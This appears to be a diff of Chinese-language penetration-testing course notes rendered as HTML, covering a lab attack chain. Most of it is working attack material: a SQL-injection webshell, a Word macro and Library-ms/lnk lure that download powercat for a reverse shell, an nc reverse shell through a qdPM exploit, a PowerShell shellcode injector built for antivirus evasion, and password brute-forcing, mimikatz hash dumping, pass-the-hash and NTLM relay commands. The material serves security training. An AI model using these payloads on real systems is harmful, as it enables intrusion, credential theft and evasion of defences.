+<pre><code class="language-python">' UNION SELECT &quot;&lt;?php system($_GET['cmd']);?&gt;&quot;, null, null, null, null INTO OUTFILE &quot;/var/www/html/tmp/webshell.php&quot; -- //
+</code></pre>
+<p>php webshell</p>
+<pre><code class="language-python">&lt;? system($_REQUEST['cmd']); ?&gt;
+</code></pre>
+<h3 id="1032-自动化">10.3.2 自动化</h3>
+<p>sqlmap（-p 参数）</p>
+<p>判断注入</p>
+<pre><code class="language-python">sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
+</code></pre>
+<p>读取数据</p>
+<pre><code class="language-python">sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
+</code></pre>
+<p>抓包注入</p>
+<pre><code class="language-python">sqlmap -r post.txt -p item  --os-shell  --web-root &quot;/var/www/html/tmp&quot;
+</code></pre>
+<h2 id="111-客户端攻击目标枚举">11.1 客户端攻击目标枚举</h2>
+<h3 id="1111-信息收集">11.1.1 信息收集</h3>
+<pre><code class="language-python">site:example.com filetype:pdf
+</code></pre>
+<p>gobuster使用-x参数指定文件后缀，下载文件，查看文件信息</p>
+<pre><code class="language-python">exiftool -a -u brochure.pdf
+</code></pre>
+<p>注意作者、程序版本等</p>
+<h3 id="1112-客户端指纹">11.1.2 客户端指纹</h3>
+<p>网站</p>
+<pre><code class="language-python">https://canarytokens.com/
+</code></pre>
+<h2 id="112-office攻击">11.2 office攻击</h2>
+<h3 id="1123-word宏横向">11.2.3 word宏横向</h3>
+<p>文件后缀</p>
+<pre><code class="language-python">.doc
+.docm
+</code></pre>
+<p>使用宏执行powershell</p>
+<pre><code class="language-python">IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
+</code></pre>
+<pre><code class="language-python">$Text = &quot;IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell&quot;
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+</code></pre>
+<p>‍</p>
+<p>‍</p>
+<p>加入到宏当中时需要50字符一行</p>
+<pre><code class="language-python">str = &quot;powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA...&quot;
+
+n = 50
+
+for i in range(0, len(str), n):
+	print(&quot;Str = Str + &quot; + '&quot;' + str[i:i+n] + '&quot;')
+</code></pre>
+<p>完整宏</p>
+<pre><code class="language-python">Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+  
+    Str = Str + &quot;powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU&quot;
+        Str = Str + &quot;AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd&quot;
+        Str = Str + &quot;AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB&quot;
+    ...
+        Str = Str + &quot;QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA&quot;
+        Str = Str + &quot;gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA&quot;
+        Str = Str + &quot;A== &quot;
+
+    CreateObject(&quot;Wscript.Shell&quot;).Run Str
+End Sub
+</code></pre>
+<h2 id="113-滥用windows库文件">11.3 滥用Windows库文件</h2>
+<h3 id="1131-利用">11.3.1 利用</h3>
+<p>涉及文件</p>
+<pre><code class="language-python">.Library-ms
+.lnk
+</code></pre>
+<p>安装webdav</p>
+<pre><code class="language-python">pip3 install wsgidav
+</code></pre>
+<p>启动webdav</p>
+<pre><code class="language-python">mkdir /home/kali/webdav
+touch /home/kali/webdav/test.txt
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+</code></pre>
+<p>创建config.Library-ms文件</p>
+<pre><code class="language-python">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://192.168.119.2&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+</code></pre>
+<p>url填写webdav地址</p>
+<p>创建automatic_configuration.lnk文件</p>
+<pre><code class="language-python">powershell.exe -c &quot;IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
+powercat -c 192.168.119.3 -p 4444 -e powershell&quot;
+</code></pre>
+<p>两个文件都放在webdav里面，然后把config.Library-ms发给用户，可以邮件可以smb</p>
+<pre><code class="language-python">cd webdav
+rm test.txt
+smbclient //192.168.50.195/share -c 'put config.Library-ms'
+</code></pre>
+<h2 id="122-在线exp库">12.2 在线exp库</h2>
+<p>网站</p>
+<pre><code class="language-python">https://www.exploit-db.com/
+https://packetstormsecurity.com/
+https://github.com/
+firefox --search &quot;Microsoft Edge site:exploit-db.com&quot;
+</code></pre>
+<h2 id="123-离线exp库">12.3 离线exp库</h2>
+<h3 id="1231-msf">12.3.1 MSF</h3>
+<p>‍</p>
+<h3 id="1232-searchsploit">12.3.2 SearchSploit</h3>
+<p>升级库</p>
+<pre><code class="language-python">sudo apt update &amp;&amp; sudo apt install exploitdb
+</code></pre>
+<p>查看exp库文件</p>
+<pre><code class="language-python">ls -1 /usr/share/exploitdb/
+ls -1 /usr/share/exploitdb/exploits
+</code></pre>
+<p>搜索制定漏洞exp</p>
+<pre><code class="language-python">searchsploit remote smb microsoft windows
+</code></pre>
+<p>拷贝到当前目录</p>
+<pre><code class="language-python">searchsploit -m windows/remote/48537.py
+searchsploit -m 42031
+</code></pre>
+<h3 id="1233-nse脚本插件">12.3.3 NSE脚本插件</h3>
+<pre><code class="language-python">grep Exploits /usr/share/nmap/scripts/*.nse
+
+nmap --script-help=clamav-exec.nse
+</code></pre>
+<h2 id="124-漏洞利用">12.4 漏洞利用</h2>
+<h3 id="1241-漏洞利用">12.4.1 漏洞利用</h3>
+<p>发现web应用程序</p>
+<pre><code class="language-python">&lt;div class=&quot;copyright&quot;&gt;
+	 &lt;a href=&quot;http://qdpm.net&quot; target=&quot;_blank&quot;&gt;qdPM 9.1&lt;/a&gt; &lt;br /&gt; Copyright &amp;copy; 2022 &lt;a href=&quot;http://qdpm.net&quot; target=&quot;_blank&quot;&gt;qdpm.net&lt;/a&gt;
+&lt;/div&gt;
+</code></pre>
+<p>exploit-db上搜索“qdPM 9.1”</p>
+<pre><code class="language-python">searchsploit -m 50944
+</code></pre>
+<pre><code class="language-python">python3 50944.py -url http://192.168.50.11/project/ -u george@AIDevCorp.org -p AIDevCorp
+curl http://192.168.50.11/project/uploads/users/420919-backdoor.php?cmd=whoami
+curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode &quot;cmd=which nc&quot;
+nc -lvnp 6666
+curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode &quot;cmd=nc -nv 192.168.50.129 6666 -e /bin/bash&quot;
+</code></pre>
+<h2 id="131-修改内存损坏型exp">13.1 修改内存损坏型exp</h2>
+<pre><code class="language-python">searchsploit &quot;Sync Breeze Enterprise 10.0.28&quot;
+searchsploit -m 42341
+</code></pre>
+<p>跨平台编译</p>
+<pre><code class="language-python">sudo apt install mingw-w64
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
+</code></pre>
+<p>报错，需要加入库文件</p>
+<pre><code class="language-python">i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+</code></pre>
+<p>需要注意的exp常见修改位置</p>
+<pre><code class="language-python">缓冲区大小
+jmpesp地址
+目标IP和端口
+shellcode
+shellcode前面加nop
+</code></pre>
+<p>msf生成shellcode</p>
+<pre><code class="language-python">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d\x25\x26\x2b\x3d&quot;
+</code></pre>
+<p>修改后重新编译</p>
+<pre><code class="language-python">i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+</code></pre>
+<p>wine执行</p>
+<pre><code class="language-python">sudo wine syncbreeze_exploit.exe
+</code></pre>
+<h2 id="132-修改web应用exp">13.2 修改Web应用exp</h2>
+<p>常见修改位置</p>
+<pre><code class="language-python">http变为https
+ssl校验
+账号密码
+文件名
+webshell
+http头中的字段，如csrf_param = &quot;_sk_&quot;
+</code></pre>
+<pre><code class="language-python">...
+    response  = requests.post(url, data=data, allow_redirects=False)
+...
+    response = requests.post(url, data=data, files=txt, cookies=cookies)
+...
+    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
+...
+</code></pre>
+<p>取消ssl校验</p>
+<pre><code class="language-python">...
+    response  = requests.post(url, data=data, allow_redirects=False, verify=False)
+...
+    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
+...
+    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
+...
+</code></pre>
+<h2 id="141-杀毒软件关键技术">14.1 杀毒软件关键技术</h2>
+<h3 id="1413-检测方法">14.1.3 检测方法</h3>
+<p>查看二进制特征码</p>
+<pre><code class="language-python">xxd -b malware.txt
+</code></pre>
+<p>查看文件hash</p>
+<pre><code class="language-python">sha256sum malware.txt
+</code></pre>
+<p>更改文件二进制后hash会变化</p>
+<p>msf生成payload</p>
+<pre><code class="language-python">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe &gt; binary.exe
+</code></pre>
+<p>原始生成基本不免杀</p>
+<h2 id="143-免杀实践">14.3 免杀实践</h2>
+<h3 id="1432-线程注入免杀">14.3.2 线程注入免杀</h3>
+<p>msf生成powershell类型shellcode</p>
+<pre><code class="language-python">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
+</code></pre>
+<p>组装ps1文件</p>
+<pre><code class="language-python">$code = '
+[DllImport(&quot;kernel32.dll&quot;)]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport(&quot;kernel32.dll&quot;)]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport(&quot;msvcrt.dll&quot;)]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+$winFunc = Add-Type -memberDefinition $code -Name &quot;Win32&quot; -namespace Win32Functions -passthru;
+
+[Byte[]];
+[Byte[]] $sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x32,0x1,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5;
+
+$size = 0x1000;
+
+if ($sc.Length -gt 0x1000) {$size = $sc.Length};
+
+$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
+
+$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+</code></pre>
+<p>有一定免杀效果，但还不够好，进一步更改变量名</p>
+<pre><code class="language-python">$winFunc   --   $var2
+Win32      --   iWin32
+$sc        --   $var1
+</code></pre>
+<p>保存成bypass.ps1，可以过掉一部分EDR</p>
+<p>在windows上运行还需要关闭执行策略的防护</p>
+<p>查看执行策略</p>
+<pre><code class="language-python">Get-ExecutionPolicy -Scope CurrentUser
+
+Undefined
+</code></pre>
+<p>修改</p>
+<pre><code class="language-python">Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+
+选A
+</code></pre>
+<p>再次查看</p>
+<pre><code class="language-python">Get-ExecutionPolicy -Scope CurrentUser
+
+Unrestricted
+</code></pre>
+<p>执行bypass.ps1获得shell</p>
+<pre><code class="language-python">PS C:\Users\offsec\Desktop&gt; .\bypass.ps1
+</code></pre>
+<h3 id="1433-自动化工具">14.3.3 自动化工具</h3>
+<p>安装</p>
+<pre><code class="language-python">apt-cache search shellter
+sudo apt install shellter
+sudo apt install wine
+dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32
+</code></pre>
+<p>运行</p>
+<pre><code class="language-python">shellter 
+A   -- 自动化插入
+输入一个要插入的PE文件
+Y   -- 进入shellter模式
+L   -- 选择列表里的payload
+1   -- 第一个反弹shell
+输入lhost和lport
+生成
+</code></pre>
+<p>msf本地监听，运行生成的PE文件获得shell</p>
+<pre><code class="language-armasm">msfconsole -x &quot;use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;&quot;
+</code></pre>
+<h2 id="151-网络服务密码爆破">15.1 网络服务密码爆破</h2>
+<h3 id="1511-ssh和rdp">15.1.1 SSH和RDP</h3>
+<p>ssh密码爆破</p>
+<pre><code class="language-armasm">hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
+</code></pre>
+<p>rdp密码喷洒</p>
+<pre><code class="language-armasm">hydra -L /usr/share/wordlists/dirb/others/names.txt -p &quot;SuperS3cure1337#&quot; rdp://192.168.50.202
+</code></pre>
+<h3 id="1512-http页面post爆破">15.1.2 HTTP页面POST爆破</h3>
+<pre><code class="language-armasm">hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form &quot;/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid&quot;
+</code></pre>
+<h2 id="152-密码破解基础">15.2 密码破解基础</h2>
+<h3 id="1522-字典变异">15.2.2 字典变异</h3>
+<p>去少量字典演示</p>
+<pre><code class="language-armasm">head /usr/share/wordlists/rockyou.txt &gt; demo.txt
+</code></pre>
+<p>去掉1开头的行</p>
+<pre><code class="language-armasm">sed -i '/^1/d' demo.txt
+</code></pre>
+<p>创建规则文件（末尾加1）</p>
+<pre><code class="language-armasm">echo \$1 &gt; demo.rule
+</code></pre>
+<p>hashcat查看规则后的字典</p>
+<pre><code class="language-armasm">hashcat -r demo.rule --stdout demo.txt
+</code></pre>
+<p>比较两个不同规则文件</p>
+<pre><code class="language-armasm">kali@kali:~/passwordattacks$ cat demo1.rule   
+$1 c
+     
+kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
+Password1
+Iloveyou1
+Princess1
+Rockyou1
+Abc1231
+
+kali@kali:~/passwordattacks$ cat demo2.rule   
+$1
+c
+
+kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
+password1
+Password
+iloveyou1
+Iloveyou
+princess1
+Princess
+</code></pre>
+<pre><code class="language-armasm">kali@kali:~/passwordattacks$ cat demo1.rule   
+$1 c $!
+
+kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
+Password1!
+Iloveyou1!
+Princess1!
+Rockyou1!
+Abc1231!
+
+kali@kali:~/passwordattacks$ cat demo2.rule   
+$! $1 c
+
+kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
+Password!1
+Iloveyou!1
+Princess!1
+Rockyou!1
+Abc123!1
+</code></pre>
+<p>演示破解hash</p>
+<pre><code class="language-armasm">kali@kali:~/passwordattacks$ cat crackme.txt   
+f621b6c9eab51a3e2f4e167fee4c6860
+
+kali@kali:~/passwordattacks$ cat demo3.rule   
+$1 c $!
+$2 c $!
+$1 $2 $3 c $!
+</code></pre>
+<p>破解</p>
+<pre><code class="language-armasm">hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
+</code></pre>
+<p>查看默认规则</p>
+<pre><code class="language-armasm">ls -la /usr/share/hashcat/rules/
+</code></pre>
+<h3 id="1524-密码管理软件">15.2.4 密码管理软件</h3>
+<p>keepass的存储文件是.kdbx后缀</p>
+<pre><code class="language-armasm">Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+</code></pre>
+<p>提取hash</p>
+<pre><code class="language-armasm">keepass2john Database.kdbx &gt; keepass.hash
+</code></pre>
+<p>删除hash中开头的</p>
+<pre><code class="language-armasm">Database:
+</code></pre>
+<p>删除后是这样的</p>
+<pre><code class="language-armasm">kali@kali:~/passwordattacks$ cat keepass.hash   
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e...
+</code></pre>
+<p>查看hashcat的破解策略</p>
+<pre><code class="language-armasm">hashcat --help | grep -i &quot;KeePass&quot;
+</code></pre>
+<p>破解</p>
+<pre><code class="language-armasm">hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+</code></pre>
+<p>也可以用john直接破解不用修改hash文件</p>
+<h3 id="1525-ssh秘钥破解">15.2.5 SSH秘钥破解</h3>
+<pre><code class="language-armasm">ssh2john id_rsa &gt; ssh.hash
+cat ssh.hash
+有$6
+hashcat -h | grep -i &quot;ssh&quot;
+$6对应 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)
+</code></pre>
+<p>创建规则</p>
+<pre><code class="language-armasm">kali@kali:~/passwordattacks$ cat ssh.rule
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+</code></pre>
+<p>创建字典</p>
+<pre><code class="language-armasm">kali@kali:~/passwordattacks$ cat ssh.passwords
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+</code></pre>
+<p>破解</p>
+<pre><code class="language-armasm">hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
+</code></pre>
+<p>或者将规则计入到john配置里进行破解</p>
+<pre><code class="language-armasm">sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule &gt;&gt; /etc/john/john.conf'
+john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+</code></pre>
+<p>得到密码，进行ssh登录</p>
+<pre><code class="language-armasm">ssh -i id_rsa -p 2222 dave@192.168.50.201
+输入密码即可登录成功
+</code></pre>
+<h2 id="153-使用密码hash">15.3 使用密码hash</h2>
+<h3 id="1531-ntlm破解">15.3.1 NTLM破解</h3>
+<p>查看本地用户</p>
+<pre><code class="language-armasm">PS C:\Users\offsec&gt; Get-LocalUser
+</code></pre>
+<p>管理员身份运行cmd或者powershell（mimikatz需要管理员权限）</p>
+<pre><code class="language-armasm">.\mimikatz.exe
+privilege::debug
+token::elevate
+lsadump::sam
+</code></pre>
+<p>获得SAM里面的hash</p>
+<pre><code class="language-armasm">User : nelly
+  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
+</code></pre>
+<p>破解</p>
+<pre><code class="language-armasm">hashcat --help | grep -i &quot;ntlm&quot;
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+</code></pre>
+<h3 id="1532-ntlm传递">15.3.2 NTLM传递</h3>
+<p>mimikatz获取hash</p>
+<pre><code class="language-armasm">.\mimikatz.exe
+privilege::debug
+token::elevate
+lsadump::sam
+</code></pre>
+<p>获得administrator的hash，使用smbclient进行hash传递</p>
+<pre><code class="language-armasm">smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+</code></pre>
+<p>可以获得smb共享以及文件</p>
+<p>或者使用psexec传递，获得shell</p>
+<pre><code class="language-armasm">impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+</code></pre>
+<p>也可以使用wmiexec传递获得shell</p>
+<pre><code class="language-armasm">impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+</code></pre>
+<h3 id="1533-net-ntlmv2破解">15.3.3 Net-NTLMv2破解</h3>
+<p>获取hash，本地（192.168.119.2）开启监听</p>
+<pre><code class="language-armasm">ip a
+sudo responder -I tap0
+</code></pre>
+<p>目标机器上执行命令</p>
+<pre><code class="language-armasm">dir \\192.168.119.2\test
+</code></pre>
+<p>获得hsah</p>
+<pre><code class="language-armasm">[+] Listening for events... 
+[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
+[SMB] NTLMv2-SSP Username : FILES01\paul
+[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 
+</code></pre>
+<p>保存hash，查看破解策略</p>
+<pre><code class="language-armasm">hashcat --help | grep -i &quot;ntlm&quot;
+
+ 5600 | NetNTLMv2
+</code></pre>
+<p>破解</p>
+<pre><code class="language-armasm">hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+</code></pre>
+<h3 id="1534-net-ntlmv2中继转发">15.3.4 Net-NTLMv2中继/转发</h3>
+<p>破解不出密码时，可以转发</p>
+<pre><code class="language-armasm">impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;
+</code></pre>
+<p>报错的话需要用python3调用py脚本</p>
+<pre><code class="language-python">python3 /usr/local/bin/ntlmrelayx.py --no-http-server -smb2support -t 192.168.240.212 -c &quot;powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA3AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA3ACAALQBwACAAOQAwADkAMAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA&quot;
+</code></pre>
+<p>powershell命令需要base64编码</p>
+<pre><code class="language-armasm">$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex &quot;. { $data } 2&gt;&amp;1&quot; | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</code></pre>
+<pre><code class="language-armasm">pwsh
+$Text = '$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.119.3&quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+</code></pre>
+<h2 id="161-windows提权信息枚举">16.1 Windows提权信息枚举</h2>
+<h3 id="1612-基本信息枚举">16.1.2 基本信息枚举</h3>
+<p>查看当前用户和组</p>
+<pre><code class="language-armasm">whoami
+whoami /groups
+</code></pre>
+<pre><code class="language-armasm">powershell
+Get-LocalUser
+Get-LocalGroup
+Get-LocalGroupMember adminteam
+Get-LocalGroupMember Administrators
+</code></pre>
+<p>查看系统信息</p>
+<pre><code class="language-armasm">systeminfo
+</code></pre>
+<p>查看网络和路由信息</p>
+<pre><code class="language-armasm">ipconfig /all
+route print
+netstat -ano
+</code></pre>
+<p>查看软件安装信息（32位和64位）</p>
+<pre><code class="language-armasm">Get-ItemProperty &quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname
+Get-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname
+</code></pre>
+<p>查看当前进程</p>
+<pre><code class="language-armasm">Get-Process
+</code></pre>
+<h3 id="1613-密码明文存储">16.1.3 密码明文存储</h3>
+<p>查找密码文件，关注常见的密码文件</p>
+<pre><code class="language-armasm">.kdbx -- keepass的密码存储文件
+type C:\xampp\passwords.txt
+type C:\xampp\mysql\bin\my.ini
+cat Desktop\asdf.txt
+</code></pre>
+<pre><code class="language-armasm">Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+</code></pre>
+<p>获得密码后可以运行用户下的cmd</p>
+<pre><code class="language-armasm">PS C:\Users\steve&gt; runas /user:backupadmin cmd
+</code></pre>
+<h3 id="1614-powershell历史记录">16.1.4 powershell历史记录</h3>
+<p>查看历史</p>
+<pre><code class="language-armasm">Get-History
+</code></pre>
+<p>历史文件位置</p>
+<pre><code class="language-armasm">(Get-PSReadlineOption).HistorySavePath
+</code></pre>
+<p>查看历史文件</p>
